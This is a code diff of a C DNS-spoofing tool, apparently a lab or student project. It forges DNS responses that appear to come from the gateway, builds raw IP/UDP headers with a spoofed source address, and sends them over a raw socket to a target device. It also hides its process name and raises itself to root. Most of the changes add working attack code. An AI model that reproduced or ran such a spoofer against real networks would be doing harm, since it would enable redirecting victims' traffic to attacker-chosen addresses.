@@ -2,7 +2,6 @@
 
 pid_t pid;
 struct options_spoofing opts;
-struct send_udp send_dns;
 
 int main(int argc, char *argv[]) {
     char errbuf[PCAP_ERRBUF_SIZE] = {0};
@@ -12,13 +11,10 @@ int main(int argc, char *argv[]) {
     struct bpf_program fp;      // holds compiled program
     bpf_u_int32 netp;           // ip
     bpf_u_int32 maskp;
-    int ip = 0;
-
-
-
 
     check_root_user();
     options_spoofing_init(&opts);
+    get_url_address();
     get_ip_address();   // Returning IP address
 
     program_setup(argc, argv);              // set process name, get root privilege
@@ -28,6 +24,7 @@ int main(int argc, char *argv[]) {
     find_gateway();
     // Confirm
     printf("=================================\n");
+    printf("   Request URL : %s\n", opts.request_url);
     printf("   Spoofing IP : %s\n", opts.spoofing_ip);
     printf("   My       IP : %s\n", opts.device_ip);
     printf("   Gateway  IP : %s\n", opts.gateway_ip);
@@ -71,7 +68,7 @@ void program_setup(int argc, char *argv[]) {
     prctl(PR_SET_NAME, MASK, 0, 0);
 
     /* Flush caches that has website already visited */
-    system("systemd-resolve --flush-caches");
+    system(FLUSH_CASH);
 
     /* change the UID/GID to 0 (raise privilege) */
     setuid(0);
@@ -83,7 +80,6 @@ void get_ip_address(void) {
     uint8_t input_length;
 
     while (1) {
-        puts("\n[ Returning IP ]");
         printf("Enter response [ IP ] when get DNS request: ");
         fflush(stdout);
         fgets(opts.spoofing_ip, sizeof(opts.spoofing_ip), stdin);
@@ -94,6 +90,22 @@ void get_ip_address(void) {
                 puts("Invalid IP address");
             }
             else break;
+        }
+    }
+}
+
+
+void get_url_address(void) {
+    uint8_t input_length;
+    while (1) {
+        puts("\n[ Returning IP ]");
+        printf("Enter [ URL ] to request to DNS: ");
+        fflush(stdout);
+        fgets(opts.request_url, sizeof(opts.request_url), stdin);
+        input_length = (uint8_t) strlen(opts.request_url);
+        if (input_length > 0 && opts.request_url[input_length - 1] == '\n') {
+            opts.request_url[input_length - 1] = '\0';
+            break;
         }
     }
 }
@@ -164,38 +176,53 @@ void sig_handler(int signum) {
 }
 
 
-void create_packet(void) {
+void create_header(char* response_packet, uint16_t size_response_payload) {
+    struct ip *ip_header = (struct ip *) response_packet;
+    struct udphdr *udp_header = (struct udphdr *) (response_packet + sizeof (struct ip));
 
     /* IP header */
-    send_dns.ip.ihl = 5;
-    send_dns.ip.version = 4;
-    send_dns.ip.tos = 0;
-    send_dns.ip.id = 0;
-    // TODO: calculate totoal length behind
-    // send_dns->ip.tot_len =
-    send_dns.ip.frag_off = 0;
-    send_dns.ip.ttl = 64;
-    send_dns.ip.protocol = IPPROTO_UDP;
-    send_dns.ip.saddr = host_convert(opts.gateway_ip);
-    send_dns.ip.daddr = host_convert(opts.device_ip);
-    // TODO: calculate checksum behind
-    // send_dns.ip.check =
+    ip_header->ip_hl = 5;
+    ip_header->ip_v = 4;
+    ip_header->ip_tos = 0;
+    ip_header->ip_id = 0;
+    ip_header->ip_len = sizeof(struct ip) + sizeof(struct udphdr) + size_response_payload;
+    ip_header->ip_off = 0;
+    ip_header->ip_ttl = 64;
+    ip_header->ip_p = IPPROTO_UDP;
+    ip_header->ip_src.s_addr = host_convert(opts.gateway_ip);
+    ip_header->ip_dst.s_addr = host_convert(opts.device_ip);
+    ip_header->ip_sum = calc_ip_checksum(ip_header);
 
     /* UDP header */
-    send_dns.udp.uh_sport = htons(53);
-    // TODO: Set the start port behind
-    // send_dns.udp.uh_dport =
-    // TODO: Set the udp len behind
-    // send_udp.udp.uh_ulen =
-    // TODO: calculate checksum behind
-    // send_udp.udp.uh_sum =
-
-    /* DNS payload */
-    send_dns.dns.flags = htons(0x8180);    // standard query response
-    send_dns.dns.question = htons(1);
-    send_dns.dns.answer = htons(4);
-    send_dns.dns.authority = htons(0);
-    send_dns.dns.additional = htons(1);
-//    send_dns.dns.queries
+    udp_header->source = htons(53);
+    udp_header->dest = htons(opts.device_port);
+    udp_header->len = htons(sizeof(struct udphdr) + size_response_payload);
+    udp_header->uh_sum = 0;
 }
 
+
+void send_dns_answer(char* response_packet, uint16_t size_response_payload) {
+    struct sockaddr_in to_addr;
+    int bytes_sent;
+    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+    int one = 1;
+    const int *val = &one;
+    int option;
+
+    if (sock < 0) {
+        fprintf(stderr, "Error creating socket");
+        return;
+    }
+    to_addr.sin_family = AF_INET;
+    to_addr.sin_port = htons(opts.device_port);
+    to_addr.sin_addr.s_addr = inet_addr(opts.device_ip);
+
+    if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0){
+        fprintf(stderr, "Error at setsockopt()");
+        return;
+    }
+
+    bytes_sent = sendto(sock, response_packet, size_response_payload, 0, (struct sockaddr *)&to_addr, sizeof(to_addr));
+    if(bytes_sent < 0)
+        fprintf(stderr, "Error sending data");
+}
